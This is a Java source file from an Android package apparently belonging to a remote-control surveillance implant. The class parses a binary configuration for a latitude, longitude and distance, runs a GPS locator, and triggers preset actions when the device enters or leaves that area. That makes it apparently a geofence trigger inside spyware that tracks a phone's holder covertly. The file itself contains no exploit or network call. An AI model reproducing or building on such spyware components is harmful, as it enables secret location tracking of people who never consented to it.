package com.ht.RCSAndroidGUI.event;

import java.io.IOException;

import android.location.Location;
import android.location.LocationListener;
import android.os.Bundle;
import android.util.Log;

import com.ht.RCSAndroidGUI.agent.position.GPSLocator;
import com.ht.RCSAndroidGUI.agent.position.GPSLocatorDistance;
import com.ht.RCSAndroidGUI.agent.position.RangeObserver;
import com.ht.RCSAndroidGUI.util.DataBuffer;

public class LocationEvent extends EventBase implements RangeObserver {

	private static final String TAG = "LocationEvent";
	int actionOnEnter;
	int actionOnExit;

	int distance;
	float latitudeOrig;
	float longitudeOrig;
	GPSLocator locator;

	@Override
	public void begin() {
		locator = new GPSLocatorDistance(this, latitudeOrig, longitudeOrig, distance);
		locator.start();
	}

	@Override
	public void end() {
		locator.halt();
		try {
			locator.join();
		} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		locator = null;
	}

	@Override
	public boolean parse(EventConf eventConf) {
		byte[] confParams = eventConf.getParams();
		final DataBuffer databuffer = new DataBuffer(confParams, 0,
				confParams.length);

		try {
			actionOnEnter = eventConf.getAction();
			actionOnExit = databuffer.readInt();

			distance = databuffer.readInt();

			latitudeOrig = (float) databuffer.readDouble();
			longitudeOrig = (float) databuffer.readDouble();
			
			
			Log.d(TAG, "Lat: " + latitudeOrig + " Lon: " + longitudeOrig
					+ " Dist: " + distance);
		}catch(IOException ex){
			return false;
		}

		return true;
	}

	@Override
	public void go() {
	}


	public void notification(Boolean onEnter) {
		if(onEnter){
			trigger(actionOnEnter);
		}else{
			trigger(actionOnExit);
		}
		
	}

}
